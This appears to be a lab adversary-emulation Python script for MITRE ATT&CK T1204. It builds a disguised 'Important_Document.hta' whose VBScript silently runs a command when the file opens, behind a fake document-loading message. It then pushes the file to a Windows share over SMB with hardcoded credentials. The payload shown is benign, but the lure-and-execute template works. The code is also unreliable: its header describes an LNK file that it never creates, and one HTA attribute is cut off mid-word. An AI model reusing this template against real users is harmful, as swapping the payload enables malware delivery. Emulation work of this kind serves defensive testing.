# < ---- DOCUMENTATION OF MITRE ATT&CK TECHNIQUE ---- >
# T1204 - User Execution
# Objective: Adversaries may rely on a user executing a malicious file. This script simulates creating a malicious-looking LNK (shortcut) file that would execute a command when clicked by a user.

# t1204_user_execution.py
import subprocess
import os

# --- Simulation Configuration ---
# An HTA file is a simple way to deliver cross-platform script execution to Windows.
MALICIOUS_HTA_FILE = "Important_Document.hta"
# The PowerShell command to execute. This is harmless but demonstrates the technique.
PAYLOAD_COMMAND = "powershell.exe -Command 'Write-Host T1204: User execution simulated!'"
TARGET_IP = "192.168.227.139"
SHARE_NAME = "LABSHARE"
USERNAME = "labadmin"
PASSWORD = "Password123!"

def create_malicious_hta(filename, payload):
    """
    Simulates T1204 by creating a malicious HTA file on the Linux host.
    This file would then need to be delivered to and opened by a user on the Windows target.
    """
    print(f"[*] T1204 Simulation: Creating a malicious HTA file for delivery to a Windows user.")
    
    hta_content = f"""
<html>
<head>
    <title>Document Viewer</title>
    <HTA:APPLICATION ID="oHTA" BORDER="thin" BORDERSTYLE="normal" CAPTION="yes" ICON="mstsc.exe" MAXIMIZEBUTTON="yes" MINIMI>
    <script language="VBScript">
        Sub Window_OnLoad
            Set oShell = CreateObject("WScript.Shell")
            oShell.Run "{payload}", 0, True
            window.close()
        End Sub
    </script>
</head>
<body>
    <p>Loading document, please wait...</p>
</body>
</html>
"""
    
    try:
        with open(filename, 'w') as f:
            f.write(hta_content.strip())
        
        print(f"[+] Successfully created malicious HTA file: '{filename}'")
        upload_via_smb(filename)

    except Exception as e:
        print(f"[!] An error occurred creating the HTA file: {e}")

def upload_via_smb(filename):
    print(f"[*] Uploading '{filename}' to Windows share via SMB (T1105).")

    smb_command = (
        f"smbclient //{TARGET_IP}/{SHARE_NAME} "
        f"-U {USERNAME}%{PASSWORD} "
        f"-c 'put {filename}'"
    )

    result = subprocess.run(
        smb_command,
        shell=True,
        capture_output=True,
        text=True
    )

    if result.returncode == 0:
        print("[+] File successfully uploaded to LABSHARE.")
    else:
        print("[!] SMB upload failed.")
        print(result.stderr)

if __name__ == "__main__":
    create_malicious_hta(MALICIOUS_HTA_FILE, PAYLOAD_COMMAND)